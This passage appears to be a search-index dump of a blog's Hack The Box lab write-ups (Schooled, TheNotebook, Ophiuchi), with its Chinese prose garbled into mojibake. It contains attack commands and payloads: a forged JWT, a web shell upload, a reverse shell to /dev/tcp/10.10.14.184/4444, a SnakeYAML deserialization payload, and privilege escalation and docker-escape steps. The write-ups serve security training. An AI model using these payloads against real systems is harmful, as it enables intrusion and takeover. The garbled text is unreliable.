-r${STAGEDIR}/ -p \\${STAGEDIR}/plist -o .\n\n![](Hackthebox-Schooled/7739097e-276e-4625-ab1d-c3f53d9335cc.png)\n\npython3 -m http.server 80\n\n![](Hackthebox-Schooled/4b11b773-31c9-49fe-8ddd-d198fde97ee0.png)\n\nåœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡\n\nç„¶ååœ¨æœåŠ¡å™¨ä¸Šç”¨wgetä¸‹ã€‚ã€‚ã€‚\n\n![](Hackthebox-Schooled/62a0e49a-eabe-4645-8c8b-a087f7d8cdc2.png)\n\nå—¯ï¼Ÿå§æ§½ï¼Ÿå¤±ç­–äº†ï¼Œå±…ç„¶æ²¡æœ‰wget\n\næµ‹è¯•äº†ä¸€ä¸‹ï¼Œvimä¹Ÿæ²¡æœ‰ï¼Œä½†æ˜¯æœ‰viå’Œnano\n\nçœ‹å¤§å®¶å–œæ¬¢ç”¨é‚£ä¸ªï¼Œåæ­£ç›´æ¥åˆ›å»ºå°±å¥½äº†\n\nåˆ›å»ºå¥½åè®°å¾—æ·»åŠ æ‰§è¡Œæƒé™\n\nchmod +x exploit.sh\n\n![](Hackthebox-Schooled/9e8706b6-ccd9-4f17-930c-9cc9f6658243.png)\n\nç„¶åæˆ‘ä»¬å®‰è£…å®ƒ\n\nsudo /usr/sbin/pkg install --no-repo-update mypackage-1.0\\_5.txz\n\n![](Hackthebox-Schooled/778332c2-581e-458f-a540-d9f4f20661f0.png)\n\n![](Hackthebox-Schooled/4d3b1319-76cc-450f-8ebb-be5be2e5780a.png)\n\nç„¶åå’±ä»¬ä½¿ç”¨SUIDæ¥æ”»å‡»\n\nbash -p\n\n![](Hackthebox-Schooled/97058f9b-4d26-4732-8cd2-fcf91b8103fc.png)\n\næˆåŠŸææƒåˆ°root\n\n![](Hackthebox-Schooled/8d844f11-d4d3-498f-b3f3-575f290a1c2c.png)\n\næˆåŠŸè·å¾—rootæƒé™çš„flag\n\næ”¶å·¥ç¡è§‰","tags":["Hackthebox"]},{"title":"TheNotebook - Hackthebox","url":"/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/","content":"\n# Hackthebox - TheNotebook\n**é¶åœºä¿¡æ¯**\n\n![](Hackthebox-TheNotebook/2f2eae2f-bb41-451a-a415-7087d6deee49.png)\n\n**é¶åœºç±»å‹**\n\n![](Hackthebox-TheNotebook/939ecfab-775b-477f-aff1-2f4fa861891d.png)\n\n**ä¿¡æ¯æœé›†**\n\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\nnmap -A -sS -sC -sV 10.10.10.230\n\n![](Hackthebox-TheNotebook/702fb2de-4379-43fb-b066-a0d19f78f6d1.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¸€å…±æœ‰ä¸‰ä¸ªç«¯å£22 80 10010ï¼Œå…¶ä¸­10010ç›®å‰æ˜¯å…³é—­çŠ¶æ€ï¼Œæ‰€ä»¥å’±ä»¬çš„çªç ´å£è¿˜æ˜¯åœ¨80ç«¯å£\n\n![](Hackthebox-TheNotebook/fc236a57-b44e-4787-a3d6-5286dad22c42.png)\n\nè¿›å»ååªæœ‰ä¸‰ä¸ªæŒ‰é’® Homeã€Registerã€Login\n\nHomeå°±æ˜¯ä¸»é¡µï¼Œæ‰€ä»¥å’±ä»¬å…ˆåˆ›å»ºä¸€ä¸ªè´¦å·è¯•è¯•\n\n![](Hackthebox-TheNotebook/7ae5d39d-39ce-48a3-99b9-e4f695be28dc.png)\n\næ³¨å†Œäº†ä¸€ä¸ªåä¸ºLucifielçš„è´¦å·ï¼Œæç¤ºæˆ‘ä»¬åœ¨/notesä¸‹å¯ä»¥æŸ¥çœ‹åˆ°ç¬”è®°ï¼Œå’±ä»¬å…ˆå»çœ‹çœ‹\n\n![](Hackthebox-TheNotebook/f6817e63-57ec-454b-8d48-60f516c24467.png)\n\nç›®å‰æ²¡æœ‰ç¬”è®°ï¼Œé‚£å°±åˆ›å»ºä¸€ä¸ªçœ‹çœ‹å§\n\n![](Hackthebox-TheNotebook/f4ab18a1-3c5f-404c-b822-3503e62aa66a.png)\n\n![](Hackthebox-TheNotebook/3a8f2463-a24e-432b-b535-f4712dd2b003.png)\n\nå—¯ã€‚ã€‚ã€‚æš‚æ—¶æ²¡ä»€ä¹ˆå¯åˆ©ç”¨çš„ï¼Œå’±ä»¬æ¥çœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°ç®¡ç†å‘˜è´¦å·å§\n\nå…ˆé€€å‡ºç™»å½•ï¼Œç„¶åç™»å½•çš„æ—¶å€™å’±ä»¬æµ‹è¯•ä¸€ä¸‹\n\nè´¦å·admin\n\n![](Hackthebox-TheNotebook/4d2cc6ca-70ff-46ed-b01a-bbf4677cfee5.png)\n\næç¤ºå¯†ç é”™è¯¯\n\nè´¦å·admin1\n\n![](Hackthebox-TheNotebook/b69bc147-0c8c-435e-9fc5-b3435e26b4ab.png)\n\næç¤ºè´¦æˆ·ä¸å­˜åœ¨\n\nå—¯ã€‚ã€‚ã€‚ç¡®å®šäº†adminè´¦æˆ·å­˜åœ¨ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨top1000è¿›è¡Œçˆ†ç ´åï¼Œå¹¶æ²¡æœ‰çˆ†ç ´å‡ºå¯†ç \n\n**æ¼æ´åˆ©ç”¨**\n\nå’±ä»¬ç™»å…¥åˆšæ‰æ³¨å†Œçš„Lucifielè´¦å·ï¼Œç„¶åçœ‹çœ‹cookie\n\n![](Hackthebox-TheNotebook/145d5347-8cbc-4434-8992-7bfe135e2d6a.png)\n\nå’±ä»¬å¯ä»¥çœ‹åˆ°authä¸‹æœ‰ä¸‰æ®µbase64çš„å­—æ®µ\n\nå’±ä»¬ä½¿ç”¨CyberChefè¿›è¡Œè§£å¯†ï¼Œä¼šå‘ç°ç¬¬ä¸‰æ®µæ˜¯ä¹±ç ï¼Œå’±ä»¬å°±è§£å¯†å‰ä¸¤æ®µå°±å¥½äº†\n\n![](Hackthebox-TheNotebook/e55f4243-96e4-4a83-9af4-23bf743e8890.png)\n\n{\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"http://localhost:7070/privKey.key\"}\n\n{\"username\":\"Lucifiel\",\"email\":\"Lucifiel@email.com\",\"admin\\_cap\":false}\n\nè§£å¯†å‡ºæ¥çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¼šå‘ç°ï¼Œä¸Šé¢æœ‰ä¸€ä¸ªJWTï¼Œæˆ‘æ„Ÿè§‰è¿™æ˜¯çªç ´å£\n\n[https://jwt.io/introduction](https://jwt.io/introduction)\n\nç›´æ¥æœç´¢JWT æ‰¾åˆ°äº†ä¸€ä¸ªå®˜ç½‘å¹¶ä¸”æœ‰ç›¸å…³çš„ä»‹ç»ï¼Œæˆ‘ä»¬å‘ç°JWTæ˜¯ä¸€ä¸ªJSON ç½‘ç»œä»¤ç‰Œ\n\n![](Hackthebox-TheNotebook/36fffcd3-9096-47e5-b7b2-64e05e40b99d.png)\n\nJWTæ ¼å¼\n\nheaders.payload.signature\n\nè¿™å°±æ˜¯å’±ä»¬çš„çªç ´å£äº†ï¼Œå¯ç®—æ˜¯æ‰¾åˆ°äº†\n\næ¼æ´åˆ©ç”¨\n\nç”±äºHeaderså’ŒPayloadæ˜¯æ˜æ–‡å‚¨å­˜çš„ï¼Œæ‰€ä»¥å’±ä»¬å…ˆæŠŠè¿™ä¸¤é¡¹ä¿®æ”¹å¥½\n\n![](Hackthebox-TheNotebook/517c99cf-27e9-4429-b0d7-7f82171703b6.png)\n\nHeaders = {\"typ\":\"JWT\",\"alg\":\"RS256\",\"kid\":\"http://10.10.14.184/privKey.key\"}\n\nPayload = {\"username\":\"Lucifiel\",\"email\":\"Lucifiel@email.com\",\"admin\\_cap\":1}\n\nä½†æ˜¯è¿™é‡Œçš„signatureä¹Ÿå°±æ˜¯å¯†é’¥å´æ˜¯åŠ å¯†çš„ï¼Œå’±ä»¬æ— æ³•ä¿®æ”¹ä¹Ÿæ— æ³•è¯»å–ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿå½“ç„¶æ˜¯Googleå•¦\n\n[https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9](https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9)\n\nssh-keygen -t rsa -b 2048 -m PEM -f privKey.key\n\n# Don't add passphrase\nopenssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub\n\ncat privKey.key\n\ncat privKey.key.pub\n\nç»è¿‡Googleæœç´¢JWTå¯†é’¥çš„ç”Ÿæˆæ”¾å¼ï¼Œå’±ä»¬æ‰¾åˆ°äº†æ‰€éœ€çš„å‘½ä»¤\n\nkalié‡Œç”Ÿæˆ\n\n![](Hackthebox-TheNotebook/a593014c-f63d-472f-9b98-e362d5d076cb.png)\n\nè¿™å°±æ˜¯å’±ä»¬è¦çš„å¯†é’¥äº†\n\n* \\----BEGIN PUBLIC KEY-----\n\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnwiGXuFO1peifvmt2y08\n\nU89mLgcwp+jxcXkp0/qURF2N9ZqnIYp/Jp6HuGJcqeeoJT/DprtAJsCs6hWJ2Fdq\n\nnSPGs63Ig6OqGJQK/dH2vt6EzQaXqRmkCeN9jwTTPmMr5xklcCtmBAGq8h4NY5LN\n\nPcB9GHudFyi8U/Ae2f/ED8koR/AyG1ZdC6SvMv3tjOmkJ5Cax+jbGJMtUGEj4Xfa\n\nNa5kJxDSq8F4Z16/I+4IO7/cfQlVOMNZ09tvEjOAUxjaD8YkueIvyOHeIXhmEY7/\n\nDF/Tkoh7fpRt+9AWEbASZi/p2m+DF9Ws/K8MyXqNjpWhLrRDpeVLuOLd33V2BQ2w\n\nRwIDAQAB\n\n* \\----END PUBLIC KEY-----\n\nå’±ä»¬å°†headerså’Œpayloadå’Œè¿›è¡Œbase64ï¼Œå¹¶ä¸”ä¿å­˜ä¸ºJWTéœ€è¦çš„æ ¼å¼headers.payload.signature\n\neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xODQvcHJpdktleS5rZXkifQ.eyJ1c2VybmFtZSI6Ikx1Y2lmaWVsIiwiZW1haWwiOiJMdWNpZmllbEBlbWFpbC5jb20iLCJhZG1pbl9jYXAiOjF9.Q0kirAQPuqVJLtkhAa0pkrB11Dy0-tDm-8H9b3HDja7VWPc4mIiupMYzUzxAZamlA1xnUA\\_x1Btx4N7lcc09GdXZ0o9Ma-q\\_j-mPu2V-iFJ5hoYSZdL91bjqGMxp-oJ38pSMW4ulJzssuiRa6wl\\_C-8n9P4i6T0gqvLQjRUr8ksaLoM1WvU4SRjRN6EH\\_oFY\\_P9rTGilC2Vt1uogZ0UZGikDmXRXy74rH\\_-Bvkx8JcFgLgM5D4xPa5ayKFJ-jF-0vazUB8oUeKMr5za1vCbJXSBSNSosQ1MhkacUkEMnOllWNgYilbZR9t1p05vUnaT7ntbsYbILxb6fk4hVU1LyYA\n\nè„šæœ¬ï¼š\n\nimport jwt\n\nkey = open(\"privKey.key.pub\", 'r').read()\n\nheaders = {\"typ\": \"JWT\", \"alg\": \"RS256\", \"kid\": \"http://10.10.14.184/privKey.key\"}\n\npayload = {\"username\": \"Lucifiel\", \"email\": \"Lucifiel@email.com\", \"admin\\_cap\": 1}\n\nprint(jwt.encode(payload, headers=headers, key=key, algorithm='RS256'))\n\nä½¿ç”¨è¯¥è„šæœ¬å³å¯ç”Ÿæˆæˆ‘ä»¬æ‰€éœ€è¦çš„cookie\n\nåœ¨å’±ä»¬æœ¬åœ°ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨\n\npython3 -m http.server 80\n\nç„¶åä¿®æ”¹10.10.10.230é¶åœºçš„cookieï¼Œç„¶ååˆ·æ–°\n\n![](Hackthebox-TheNotebook/730868bd-9a0f-42ae-ae68-6dcf8929514a.png)\n\nå’±ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæˆåŠŸè¶Šæƒï¼Œç„¶åå‡ºç°äº†ä¸€ä¸ªæŒ‰é’® admin panel å’±ä»¬è®¿é—®\n\n![](Hackthebox-TheNotebook/73645d78-5933-4ce5-b1c3-b53d18779f41.png)\n\nå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶\n\n![](Hackthebox-TheNotebook/f99489ed-6001-4786-9298-150672387762.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç®¡ç†å‘˜åˆ›å»ºäº†ä¸€ä¸ªç¬”è®°ï¼Œæ„æ€æ˜¯å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶\n\n[https://github.com/Arrexel/phpbash](https://github.com/Arrexel/phpbash)\n\nå’±ä»¬ä¸Šä¼ ä¸€ä¸ªphpé©¬ä¸Šå»\n\n![](Hackthebox-TheNotebook/cdbfa09b-5422-4bfc-9d1c-fdc87f0aa5f8.png)\n\n![](Hackthebox-TheNotebook/5db51c62-197c-4952-83c9-59c0cb9959d9.png)\n\næˆåŠŸè·å¾—ä¸€ä¸ªwww-dataæƒé™çš„shell\n\n**æƒé™æå‡**\n\n![](Hackthebox-TheNotebook/b2072937-fd75-479f-a8cb-afff9497b4da.png)\n\næˆ‘ä»¬çœ‹ç®¡ç†å‘˜è¯´å­˜åœ¨backupså¤‡ä»½æ–‡ä»¶\n\n![](Hackthebox-TheNotebook/58e20e35-2ab3-4d23-ac3d-216caf5d308c.png)\n\nå’±ä»¬å†/var/backups/ç›®å½•ä¸‹å‘ç°ä¸€ä¸ª[home.tar.gz](http://home.tar.gz/)æ–‡ä»¶ï¼Œå’±ä»¬åœ¨é¶æœºä¸Šå¼€å¯httpæœåŠ¡æŠŠä»–æä¸‹æ¥\n\npython3 -m http.server 8888\n\n![](Hackthebox-TheNotebook/9f7193bf-c54e-4dc2-bbe7-3eaa7e01dc1d.png)\n\n![](Hackthebox-TheNotebook/0158a21d-f415-4b49-9efb-da5bc35e6f6d.png)\n\n![](Hackthebox-TheNotebook/e62ecc12-6e6e-42c2-94dc-d486b5e3dbfb.png)\n\næˆ‘ä»¬æ‰¾åˆ°äº†noahç”¨æˆ·çš„å…¬é’¥å’Œç§é’¥\n\n![](Hackthebox-TheNotebook/0b35c0c5-6062-4ab8-a010-6d4193e467d0.png)\n\nç›´æ¥ä½¿ç”¨å¯†é’¥ç™»å½•ï¼ŒæˆåŠŸç™»å½•\n\n![](Hackthebox-TheNotebook/3b3da359-a5cf-4aca-9466-434893277951.png)\n\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag\n\n![](Hackthebox-TheNotebook/4b5b9fe9-3eac-4705-8f19-7874a6239905.png)\n\nå’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹sudoæƒé™\n\nå‘ç°å¯ä»¥ä½¿ç”¨dockerè¿è¡Œwebapp-dev01è¿™ä¸ªè„šæœ¬ \\* ä»£è¡¨å¯ä»¥æ¥å—äººå’Œå‚æ•°\n\n![](Hackthebox-TheNotebook/70bac475-ba53-4841-bbeb-a57e212f2553.png)\n\nç›´æ¥suæˆåŠŸåˆ‡æ¢åˆ°rootç”¨æˆ·\n\nsudo /usr/bin/docker exec -it webapp-dev01 sh -c \"su\"\n\n![](Hackthebox-TheNotebook/5a58e090-0bab-4283-96c7-12fb8deb13b0.png)\n\næˆ‘ä»¥ä¸ºäº‹æƒ…åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œæ¯•ç«Ÿå’±ä»¬å·²ç»æ‹¿åˆ°rootæƒé™äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°flagå°±å¥½äº†ï¼Œä½†æ˜¯åœ¨å¯»æ‰¾flagçš„æ—¶å€™\n\n![](Hackthebox-TheNotebook/7efcc029-3dd4-4279-b580-8db8db1fb5bb.png)\n\nå‘ç°rootæ–‡ä»¶ä¸ºç©ºï¼Œå†ç»“åˆå’±ä»¬æ‰€å¤„çš„ç¯å¢ƒæ¥è¿›è¡Œåˆ¤æ–­ï¼Œæˆ‘ä¸å¾—ä¸ç›¸ä¿¡ï¼Œæˆ‘ä»¬å±…ç„¶æ˜¯åœ¨ä¸€ä¸ªdockeré‡Œï¼Ÿæ‰€ä»¥ç°åœ¨è¿˜å¾—è¿›è¡Œdockeré€ƒé€¸ï¼Ÿ\n\nè¿™ä¸ªé¶åœºï¼Œç¡®å®æœ‰éš¾åº¦çš„å‘€\n\n**dockeré€ƒé€¸**\n\n[https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)\n\nç»è¿‡æŸ¥è¯¢ï¼Œå‘ç°docker execæ˜¯å­˜åœ¨cveæ¼æ´çš„ å’±ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨\n\n![](Hackthebox-TheNotebook/b7af135e-eb37-4596-926b-3c6d77dff25f.png)\n\nvar payload = \"#! /bin/bash \\\\n bash -i >& /dev/tcp/10.10.14.184/4444 0>&1\"\n\nå’±ä»¬ä¸‹è½½ä¸‹æ¥åä¿®æ”¹payload\n\nä¿®æ”¹å¥½payloadä»¥åï¼Œå’±ä»¬ä½¿ç”¨golangè¿›è¡Œç¼–è¯‘\n\n![](Hackthebox-TheNotebook/118b622a-1483-4386-b10d-a803f457db81.png)\n\nç„¶åä¸Šä¼ åˆ°æœåŠ¡å™¨å†…ï¼Œåœ¨æœ¬åœ°å¼€å¯httpæœåŠ¡\n\npython3 -m http.server 80\n\n![](Hackthebox-TheNotebook/7e42a6a4-68a6-4be4-9e52-b8423cf4bcb3.png)\n\nåœ¨æœ¬åœ°å¯åŠ¨ncè¿›è¡Œç›‘å¬\n\n![](Hackthebox-TheNotebook/a648b661-fbdc-4abc-94c7-fc64e189b0c3.png)\n\nä¸Šä¼ åè¿è¡Œ\n\nç¬¬ä¸€ä¸ªrootæƒé™è¿è¡Œè„šæœ¬\n\n![](Hackthebox-TheNotebook/7bed5f75-409e-4f9d-881b-c811690b3ec4.png)\n\nç¬¬äºŒä¸ªnoahæƒé™è¿è¡ŒæŒ‡ä»¤\n\n![](Hackthebox-TheNotebook/020af329-4432-4dfc-821d-74b081db95a3.png)\n\n![](Hackthebox-TheNotebook/2ddff0ab-5bab-4c03-9f08-527c24d641b4.png)\n\næˆåŠŸè·å¾—rootæƒé™\n\n![](Hackthebox-TheNotebook/35a7b161-62bb-4941-aa12-24ef6bff7410.png)\n\n![](Hackthebox-TheNotebook/6d106a27-e1d7-481a-bddb-fe9663d724c9.png)\n\næˆåŠŸå¾—åˆ°rootæƒé™flag\n\næœ€åæ€»ç»“ï¼šè¿™å°æœºå™¨ç¡®å®æŒºæœ‰éš¾åº¦çš„ï¼Œæˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°éœ€è¦è™šæ‹Ÿæœºé€ƒé€¸çš„é¶åœºã€‚è¿™å°æœºå™¨è€—æ—¶ä¸¤å¤©ï¼Œå»æ‰ç¡è§‰å’Œä¼‘æ¯æ—¶é—´è¿˜æœ‰å·¥ä½œæ—¶é—´ï¼Œè€—æ—¶åº”è¯¥è¶…è¿‡10å°æ—¶ï¼Œç¡®å®å¯¹å¾—èµ·è¿™ä¸ªéš¾åº¦ã€‚è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œå­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ï¼Œå…¶ä¸­æœ‰ä¸€äº›ç„å­¦é—®é¢˜ï¼Œè¯·æ•™äº†ä¸å°‘å¤§ä½¬\n\næ­¤å¤„åœ¨è¿™æ„Ÿè°¢æˆ‘å®å®å¸ˆå‚…@ loid\n\nå¯ç®—æ˜¯åšå®Œäº†ï¼Œè¿™ä¸¤å¤©åšçš„å¿«è„‘æº¢è¡€äº†ï¼Œå°±æ˜¯å› ä¸ºä¸€å¤©æ—¶é—´æ²¡æœ‰åšå‡ºæ¥ï¼Œæ‰€ä»¥æ‹–æ›´äº†ä¸€å¤©","tags":["Hackthebox"]},{"title":"Ophiuchi - Hackthebox","url":"/2021/06/01/Hackthebox/Medium/Hackthebox-Ophiuchi/","content":"\n# Hackthebox - Ophiuchi\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Ophiuchi/bb2b3b64-d318-4d4f-a0bc-165526dc65a5.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Ophiuchi/48e28a0b-adc8-4b59-b453-51590cfdc576.png)\n\n# ä¿¡æ¯æœé›†\n## Nmap\né¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\nnmap -A -sS -sC -sV 10.10.10.227\n\n![](Hackthebox-Ophiuchi/756fd8cc-a7bc-4287-b42c-7eb59a4fafda.png)\n\n## Http\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¼€å¯äº†22å’Œ8080ç«¯å£ï¼Œè®©æˆ‘ä»¬è®¿é—®8080ç«¯å£çœ‹çœ‹\n\n![](Hackthebox-Ophiuchi/041547b0-274e-4b92-aec0-2bb99be365dd.png)\n\nè¿™æ˜¯ä¸ªå•¥ï¼Ÿä¸€ä¸ªYAMLåœ¨çº¿è§£æå™¨ï¼Œè®©æˆ‘ä»¬éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿è¯•è¯•\n\n![](Hackthebox-Ophiuchi/b1baf97e-c71b-4085-a0e0-ad9329272546.png)\n\næ­¤åŠŸèƒ½å·²æš‚åœï¼Œå—¯ã€‚ã€‚ã€‚æœ‰ç‚¹æ„æ€\n\næˆ‘ä»¬å…ˆçœ‹çœ‹å…¶ä»–åŠŸèƒ½ç‚¹ï¼Œæ¯”å¦‚tomcat ç‰ˆæœ¬ä¸º Apache Tomcat 9.0.38\n\nç›´æ¥ç™»å½•è¯•è¯•ï¼Œä¸‡ä¸€æœ‰0dayå‘¢ï¼Ÿï¼ˆå¼±å£ä»¤ï¼‰\n\n```bash\n[http://10.10.10.227:8080/manager](http://10.10.10.227:8080/manager)\n```\nå’±ä»¬å»ç™»å½•è¯•è¯•\n\n![](Hackthebox-Ophiuchi/dee71ed1-c1e6-444a-9c01-d31dfbba76c4.png)\n\næµ‹è¯•äº†å‡ ä¸ªé»˜è®¤å£ä»¤å‡æ— æ•ˆï¼Œçœ‹æ¥è¿˜æ˜¯å¾—æŠŠç›®å…‰æ”¾åˆ°YAMLä¸Šäº†ï¼Œå»googleæ‰¾æ‰¾èµ„æ–™å§\n\nåœ¨æœç´¢è¿‡ç¨‹ä¸­ï¼Œå‘ç°tomcat 9.0.38å­˜åœ¨ Snake yaml ååºåˆ—åŒ–æ¼æ´\n\nYAMLåœ¨çº¿è§£æå™¨å…·æœ‰javaç±»æ„é€ å‡½æ•°çš„åŠŸèƒ½\n\nOKï¼Œé‚£æ€è·¯å°±æœ‰äº†\n\n# æ¼æ´åˆ©ç”¨\nä½¿ç”¨python3åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨\n\n```bash\npython3 -m http.server 80\n```\n![](Hackthebox-Ophiuchi/e34f7a11-fde0-4f05-9135-9287eac00b9a.png)\n\nä½¿ç”¨YAMLè§£æå‘½ä»¤\n\n```bash\n!!javax.script.ScriptEngineManager [\n    !!java.net.URLClassLoader [[\n        !!java.net.URL [\"http://10.10.14.184/\"]\n    ]]\n]\n```\n![](Hackthebox-Ophiuchi/cc64a6f6-9f96-4115-ae06-8ba1fa5794b4.png)\n\nç‚¹å‡»è§£æçœ‹çœ‹\n\n![](Hackthebox-Ophiuchi/010084b7-6c85-4974-8c0f-9a87f1b389b3.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶æ˜¯å¤±è´¥ï¼Œä½†ç¡®å®/META-INF/services/javax.script.ScriptEngineFactory å‘æˆ‘ä»¬çš„æœºå™¨å‘å‡ºäº†è¯·æ±‚\n\næˆ‘ä»¬å¯ä»¥ä¿æŒç›¸åŒçš„æ–‡ä»¶ç»“æ„æ¥åˆ©ç”¨å®ƒï¼Œä¾‹å¦‚å…·æœ‰ç›®å½•â€œMETA-INFâ€ç„¶åæ˜¯ services å…·æœ‰æ–‡ä»¶åçš„å­ç›®å½• javax.script.ScriptEngineFactoryï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å°†è°ƒç”¨æˆ‘ä»¬çš„exploit\n\n![](Hackthebox-Ophiuchi/cd2958e3-d629-48c2-8606-1228204b5c55.png)\n\nåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œexploit.java å¯ä»¥ä»è¿™é‡Œè·å–javaä»£ç ï¼Œç„¶åæˆ‘ä»¬å°†å°è¯•pingæˆ‘ä»¬çš„æœ¬åœ°æœºå™¨ä»¥æŸ¥çœ‹exploitæ˜¯å¦æœ‰æ•ˆï¼Œä»¥ä¾¿æˆ‘ä»¬è·å¾—åå‘shell\n\n> [https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java](https://github.com/LucifielHack/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java)\n\nå°†è¯¥ä»£ç ä¿å­˜ä¸ºexploit.java\n\n![](Hackthebox-Ophiuchi/3f5a9c75-e4d6-4b4d-bb84-f255f2fabace.png)\n\nç„¶åä½¿ç”¨javacè¿›è¡Œç¼–è¯‘ï¼Œå³å¯å¾—åˆ°.classæ–‡ä»¶\n\n![](Hackthebox-Ophiuchi/67d0a010-c44b-4972-b2f5-5a18b5d97121.png)\n\næˆ‘ä»¬å°†snakeyaml.exploitå†™å…¥åˆ°javax.script.ScriptEngineFactoryä¸­\n\n![](Hackthebox-Ophiuchi/0e044d36-a0eb-4098-9047-35ce6b5c5d32.png)\n\nç„¶åæˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ snakeyamlï¼Œç„¶åå°†æ–‡ä»¶ç»“æ„è¿™æ ·æ”¾\n\n![](Hackthebox-Ophiuchi/a488d234-bf2a-45a1-830a-fbee6931ceff.png)\n\nç„¶åæˆ‘ä»¬åœ¨Ophiuchiç›®å½•ä¸‹ä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡å™¨\n\nç„¶ååœ¨YAMLä¸­å±äºæˆ‘ä»¬ç¬¬ä¸€æ¬¡è°ƒç”¨çš„pocæ¥è¿›è¡Œè°ƒç”¨\n\n![](Hackthebox-Ophiuchi/640299e6-b57d-4268-a7fb-c8fc96dff19a.png)\n\n![](Hackthebox-Ophiuchi/af532cfd-00a6-4ebf-8b30-3bd48c715c91.png)\n\næˆåŠŸ\n\nç„¶åæˆ‘ä»¬åœ¨Ophiuchiç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªexploit.shè„šæœ¬\n\n![](Hackthebox-Ophiuchi/8d245e83-0a91-41a3-b9eb-5388d3289857.png)\n\nè¿™ä¸ªè„šæœ¬æ˜¯ç”¨æ¥åå¼¹shellç”¨çš„\n\nç„¶åæˆ‘ä»¬æœ¬åœ°ä½¿ç”¨ncå¼€å¯ä¸€ä¸ªç›‘å¬ç«¯å£\n\n```bash\nnc -nvlp 4444\n```\nç„¶åï¼Œæˆ‘ä»¬å°†wgetå°†åˆšæ‰å†™çš„bashè„šæœ¬ä¸‹è½½å¹¶ä¿å­˜åˆ°/tmpç›®å½•ä¸­ï¼Œç„¶åä½¿ç”¨bashæ‰§è¡Œå®ƒï¼Œç°åœ¨æˆ‘ä»¬ä¼‘è¦ä¿®æ”¹æˆ‘ä»¬çš„exploit.javaæ–‡ä»¶\n\n![](Hackthebox-Ophiuchi/ae33afab-b8a8-4acb-b849-072e9cceb132.png)\n\nç„¶åé‡æ–°ç¼–è¯‘exploit.javaæ–‡ä»¶\n\nåœ¨YAMLä¸­ç»§ç»­æ‰§è¡Œæˆ‘ä»¬åˆšæ‰çš„ä»£ç \n\n![](Hackthebox-Ophiuchi/947d54ed-8ffe-4019-8430-fcdee7bebcc8.png)\n\næˆåŠŸè·å–åˆ°shellï¼Œå¹¶ä¸”ä½¿ç”¨python3è·å¾—ä¸€ä¸ªç¨³å®šçš„shell\n\n```bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")';\n```\nPSï¼šå¦‚æœè¿™é‡Œæ²¡æœ‰è·å–åˆ°ï¼Œé‚£åº”è¯¥æ˜¯javaçš„ç‰ˆæœ¬ä¸å¯¹ï¼Œæ–°ç‰ˆæœ¬javaä¸è¡Œï¼Œå¿…é¡»å¾—ä½¿ç”¨java class 55ç‰ˆæœ¬è¿›è¡Œç¼–è¯‘\n\nä»£ç  javac --release 11 exploit.java\n\nç„¶åæˆ‘ä»¬æˆ‘ä»¬çŸ¥é“ï¼Œè¯¥webæœåŠ¡å™¨æ˜¯ä½¿ç”¨apache tomcatè¿›è¡Œæ­å»ºè¿è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å»æŸ¥çœ‹tomcatçš„é…ç½®æ–‡ä»¶\n\nä½¿ç”¨findå‘½ä»¤è¿›è¡ŒæŸ¥æ‰¾\n\n```bash\nfind / -name \"tomcat-users.xml\" 2>/dev/null\n```\n![](Hackthebox-Ophiuchi/f0bd46a5-2084-41a4-a667-6c8494772caa.png)\n\næ‰¾åˆ°äº†ï¼Œç„¶åä½¿ç”¨catæŸ¥çœ‹å³å¯\n\n![](Hackthebox-Ophiuchi/0f03f868-418c-4610-835b-1d7bb8f7bfcd.png)\n\nå¾—åˆ°äº†è´¦å·å¯†ç \n\n```bash\nusername = admin\npassword = 